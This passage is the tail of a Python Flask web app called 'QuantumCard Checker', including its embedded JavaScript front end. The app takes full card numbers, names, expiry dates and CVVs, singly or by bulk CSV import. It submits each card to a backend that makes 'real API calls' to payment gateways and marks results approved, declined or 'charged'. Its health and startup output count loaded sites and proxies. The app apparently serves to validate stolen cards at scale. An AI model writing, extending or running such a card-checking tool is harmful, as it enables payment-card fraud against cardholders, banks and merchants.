            showDashboard();
            await loadResults();
            loginTab.click();
        } else {
            alert(d.error || 'Registration failed');
        }
    } catch (e) { alert('Network error'); }
});

logoutBtn.addEventListener('click', async () => {
    try { await fetch('/api/logout', {method: 'POST'}); } catch (e) {}
    currentUser = null;
    showAuth();
    loginTab.click();
});

// ── Dashboard tabs ──
checkCardTab.addEventListener('click', () => {
    cardChecker.classList.remove('hidden');
    results.classList.add('hidden');
});

resultsTab.addEventListener('click', async () => {
    cardChecker.classList.add('hidden');
    results.classList.remove('hidden');
    await loadResults();
});

// ── Card preview ──
cardNumber.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    e.target.value = formatted.trim();
    cardNumberDisplay.textContent = formatted.trim() || '•••• •••• •••• ••••';
    detectCardType(value);
});

cardName.addEventListener('input', (e) => {
    cardNameDisplay.textContent = e.target.value.toUpperCase() || 'FULL NAME';
});

cardExpiry.addEventListener('input', (e) => {
    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
    e.target.value = value;
    cardExpiryDisplay.textContent = value || 'MM/YY';
});

cardCvv.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 4);
    cardCvvDisplay.textContent = '*'.repeat(e.target.value.length) || '•••';
});

flipCardBtn.addEventListener('click', (e) => {
    e.preventDefault();
    isCardFlipped = !isCardFlipped;
    if (isCardFlipped) cardContainer.classList.add('card-flipped');
    else cardContainer.classList.remove('card-flipped');
});

// ── Add card ──
cardForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const cardData = {
        number: cardNumber.value.replace(/\s+/g, ''),
        name: cardName.value,
        expiry: cardExpiry.value,
        cvv: cardCvv.value,
        type: getCardType(cardNumber.value.replace(/\s+/g, ''))
    };
    if (!validateCardData(cardData)) return;
    addCardToList(cardData);
    cardForm.reset();
    cardNumberDisplay.textContent = '•••• •••• •••• ••••';
    cardNameDisplay.textContent = 'FULL NAME';
    cardExpiryDisplay.textContent = 'MM/YY';
    cardCvvDisplay.textContent = '•••';
    cardTypeDisplay.style.backgroundImage = 'none';
    isCardFlipped = false;
    cardContainer.classList.remove('card-flipped');
});

function detectCardType(n) {
    let url = 'none';
    if (/^4/.test(n)) url = 'url("https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png")';
    else if (/^5[1-5]/.test(n)) url = 'url("https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png")';
    else if (/^3[47]/.test(n)) url = 'url("https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/American_Express_logo.svg/1200px-American_Express_logo.svg.png")';
    else if (/^6(?:011|5)/.test(n)) url = 'url("https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Discover_Card_logo.svg/1200px-Discover_Card_logo.svg.png")';
    cardTypeDisplay.style.backgroundImage = url;
}

function getCardType(n) {
    if (/^4/.test(n)) return 'visa';
    if (/^5[1-5]/.test(n)) return 'mastercard';
    if (/^3[47]/.test(n)) return 'amex';
    if (/^6(?:011|5)/.test(n)) return 'discover';
    return 'unknown';
}

function validateCardData(c) {
    if (c.number.length < 13 || c.number.length > 19) { alert('Invalid card number'); return false; }
    if (!c.name.trim()) { alert('Please enter card holder name'); return false; }
    if (!c.expiry || !/^\d{2}\/\d{2}$/.test(c.expiry)) { alert('Invalid expiry (MM/YY)'); return false; }
    if (!c.cvv || (c.type === 'amex' ? c.cvv.length !== 4 : c.cvv.length !== 3)) {
        alert(`Invalid CVV (${c.type === 'amex' ? '4' : '3'} digits)`); return false;
    }
    return true;
}

function addCardToList(cardData) {
    cardsToCheck.push({...cardData, id: Date.now().toString()});
    saveCards();
    renderCardList();
    updateCardCount();
}

function renderCardList() {
    if (cardsToCheck.length === 0) {
        emptyCardListMessage.classList.remove('hidden');
        cardList.innerHTML = '';
        cardList.appendChild(emptyCardListMessage);
        return;
    }
    emptyCardListMessage.classList.add('hidden');
    cardList.innerHTML = '';
    cardsToCheck.forEach((card) => {
        const el = document.createElement('div');
        el.className = 'flex justify-between items-center p-4 bg-white rounded-lg shadow-sm mb-3 last:mb-0 border border-gray-200';
        const fn = card.number.replace(/(\d{4})/g, '$1 ').trim();
        const masked = fn.substring(0, 7) + '•••• •••• ' + fn.substring(fn.length - 4);
        el.innerHTML = `
            <div class="flex items-center">
                <div class="w-10 h-8 mr-3 ${card.type === 'visa' ? 'bg-blue-500' : card.type === 'mastercard' ? 'bg-red-500' : card.type === 'amex' ? 'bg-green-500' : 'bg-gray-500'} rounded flex items-center justify-center">
                    <i class="fab fa-cc-${card.type} text-white"></i>
                </div>
                <div>
                    <div class="font-medium">${masked}</div>
                    <div class="text-xs text-gray-500">${card.name} · ${card.expiry}</div>
                </div>
            </div>
            <button class="check-card-btn px-3 py-1 bg-purple-600 text-white rounded text-sm hover:bg-purple-700" data-id="${card.id}">
                <i class="fas fa-check mr-1"></i> Check
            </button>`;
        cardList.appendChild(el);
    });
    document.querySelectorAll('.check-card-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const id = e.target.closest('button').getAttribute('data-id');
            const card = cardsToCheck.find(c => c.id === id);
            if (card) checkSingleCard(card);
        });
    });
}

function updateCardCount() { cardCount.textContent = cardsToCheck.length; }

// ── CSV ──
importCsvBtn.addEventListener('click', () => csvFile.click());
csvFile.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => parseCSV(ev.target.result);
    reader.readAsText(file);
});

sampleCsvBtn.addEventListener('click', () => {
    const csv = "number,name,expiry,cvv\n4111111111111111,JOHN DOE,12/25,123\n5555555555554444,JANE SMITH,05/24,456\n378282246310005,ALEX JOHNSON,08/23,1234";
    const blob = new Blob([csv], {type: 'text/csv;charset=utf-8;'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'sample_cards.csv';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
});

function parseCSV(content) {
    const lines = content.split('\n').filter(l => l.trim() !== '');
    if (lines.length < 2) return alert('Empty CSV');
    const headers = lines[0].split(',').map(h => h.trim().toLowerCase());
    const idx = (k) => headers.indexOf(k);
    if (idx('number') < 0 || idx('expiry') < 0 || idx('cvv') < 0) {
        return alert('CSV must have columns: number,name,expiry,cvv');
    }
    let valid = 0, invalid = 0;
    for (let i = 1; i < lines.length; i++) {
        const v = lines[i].split(',');
        if (v.length < headers.length) continue;
        const c = {
            number: v[idx('number')].replace(/\s+/g, ''),
            name: idx('name') >= 0 ? v[idx('name')] : 'UNKNOWN',
            expiry: v[idx('expiry')].trim(),
            cvv: v[idx('cvv')].trim(),
            type: getCardType(v[idx('number')].replace(/\s+/g, '')),
        };
        if (validateCardData(c)) {
            c.id = Date.now() + '_' + i;
            cardsToCheck.push(c);
            valid++;
        } else invalid++;
    }
    saveCards();
    renderCardList();
    updateCardCount();
    alert(`Imported ${valid} valid, ${invalid} skipped`);
}

// ── Check All ──
checkAllBtn.addEventListener('click', async () => {
    if (cardsToCheck.length === 0) return alert('No cards to check');
    if (!confirm(`Check ${cardsToCheck.length} cards? This performs real API calls.`)) return;

    const btn = checkAllBtn;
    const orig = btn.innerHTML;
    btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Checking...`;
    btn.disabled = true;

    let processed = 0, failed = 0;
    const snapshot = [...cardsToCheck];

    for (const card of snapshot) {
        try {
            const result = await validateCardWithPaymentGateway(card);
            testResults.unshift(result);
            cardsToCheck = cardsToCheck.filter(c => c.id !== card.id);
            saveCards();
            if (processed % 2 === 0) {
                renderCardList(); updateCardCount(); updateStats();
            }
            processed++;
        } catch (err) {
            console.error(err);
            failed++;
        }
        await new Promise(r => setTimeout(r, 400));
    }
    renderCardList(); updateCardCount(); updateStats();
    btn.innerHTML = orig; btn.disabled = false;
    alert(`Done. ${processed} processed, ${failed} failed.`);
});

// ── Check single (calls backend) ──
async function checkSingleCard(card) {
    const btn = document.querySelector(`.check-card-btn[data-id="${card.id}"]`);
    const orig = btn ? btn.innerHTML : '';
    if (btn) { btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i>`; btn.disabled = true; }

    try {
        const result = await validateCardWithPaymentGateway(card);
        testResults.unshift(result);
        cardsToCheck = cardsToCheck.filter(c => c.id !== card.id);
        saveCards();
        renderCardList(); updateCardCount(); updateStats();
        alert(`Card ${result.status === 'approved' ? 'APPROVED' : 'DECLINED'}: ${result.message}`);
    } catch (e) {
        alert('Error: ' + e.message);
    } finally {
        if (btn) { btn.innerHTML = orig; btn.disabled = false; }
    }
}

async function validateCardWithPaymentGateway(card) {
    const r = await fetch('/api/check-card', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(card)
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || 'Check failed');
    return data;
}

// ── Results (fetched from server) ──
async function loadResults() {
    try {
        const r = await fetch('/api/results');
        const d = await r.json();
        testResults = d.results || [];
        updateStats();
        renderResultsTable();
    } catch (e) { console.error(e); }
}

function updateStats() {
    const ap = testResults.filter(x => x.status === 'approved').length;
    const dc = testResults.filter(x => x.status === 'declined').length;
    approveCount.textContent = ap;
    declineCount.textContent = dc;
}

filterStatus.addEventListener('change', renderResultsTable);
filterType.addEventListener('change', renderResultsTable);
exportResultsBtn.addEventListener('click', exportResultsToCSV);

function renderResultsTable() {
    let filtered = [...testResults];
    const sf = filterStatus.value;
    const tf = filterType.value;
    if (sf !== 'all') filtered = filtered.filter(r => r.status === sf);
    if (tf !== 'all') filtered = filtered.filter(r => r.card_type === tf);

    resultsTableBody.innerHTML = '';
    if (filtered.length === 0) {
        resultsTableBody.innerHTML = `<tr><td colspan="7" class="px-6 py-4 text-center text-gray-500">No results match your filters.</td></tr>`;
        return;
    }

    filtered.forEach(r => {
        const fn = String(r.card_number || '');
        const masked = fn.substring(0, 4) + '•••• •••• ' + fn.substring(fn.length - 4);
        const cat = (r.category || r.status || '').toUpperCase();
        const catColor = r.category === 'charged' ? 'bg-purple-100 text-purple-800'
                       : r.status === 'approved' ? 'bg-green-100 text-green-800'
                       : 'bg-red-100 text-red-800';
        const typeColor = r.card_type === 'visa' ? 'bg-blue-100 text-blue-800'
                        : r.card_type === 'mastercard' ? 'bg-red-100 text-red-800'
                        : r.card_type === 'amex' ? 'bg-green-100 text-green-800'
                        : 'bg-gray-100 text-gray-800';
        const row = document.createElement('tr');
        row.innerHTML = `
            <td class="px-6 py-4 whitespace-nowrap">
                <div class="flex items-center">
                    <div class="w-8 h-6 mr-2 ${r.card_type === 'visa' ? 'bg-blue-500' : r.card_type === 'mastercard' ? 'bg-red-500' : r.card_type === 'amex' ? 'bg-green-500' : 'bg-gray-500'} rounded flex items-center justify-center">
                        <i class="fab fa-cc-${r.card_type} text-white text-xs"></i>
                    </div>
                    <div class="font-mono">${masked}</div>
                </div>
            </td>
            <td class="px-6 py-4 whitespace-nowrap">
                <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${typeColor}">
                    ${(r.card_type || 'unknown').toUpperCase()}
                </span>
            </td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${r.expiry || '-'}</td>
            <td class="px-6 py-4 whitespace-nowrap">
                <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${catColor}">
                    ${cat}
                </span>
            </td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">$${Number(r.amount || 0).toFixed(2)}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${r.message || '-'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${new Date((r.timestamp || 0) * 1000).toLocaleString()}</td>`;
        resultsTableBody.appendChild(row);
    });
}

function exportResultsToCSV() {
    if (testResults.length === 0) return alert('No results');
    let csv = "Number,Type,Expiry,Status,Category,Amount,Message,Gateway,Timestamp\n";
    testResults.forEach(r => {
        const fn = String(r.card_number || '');
        const masked = fn.substring(0, 4) + '••••••••' + fn.substring(fn.length - 4);
        csv += `"${masked}",${r.card_type},${r.expiry},${r.status},${r.category},${r.amount},"${(r.message||'').replace(/"/g,'\\"')}",${r.gateway},${new Date((r.timestamp||0)*1000).toISOString()}\n`;
    });
    const blob = new Blob([csv], {type: 'text/csv;charset=utf-8;'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'card_checker_results.csv';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
}
</script>
</body>
</html>'''

# ═══════════════════════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════════════════════
@app.route('/')
def index():
    return Response(HTML_TEMPLATE, mimetype='text/html')

@app.route('/health')
def health():
    return jsonify({
        'ok': True,
        'sites': len(load_sites()),
        'proxies': len(load_proxies()),
        'api': DEFAULT_API_URL,
    })

# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    init_db()
    print(f"✅ QuantumCard Checker running")
    print(f"   → http://0.0.0.0:{PORT}")
    print(f"   → Sites: {len(load_sites())} · Proxies: {len(load_proxies())}")
    print(f"   → API: {DEFAULT_API_URL}")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
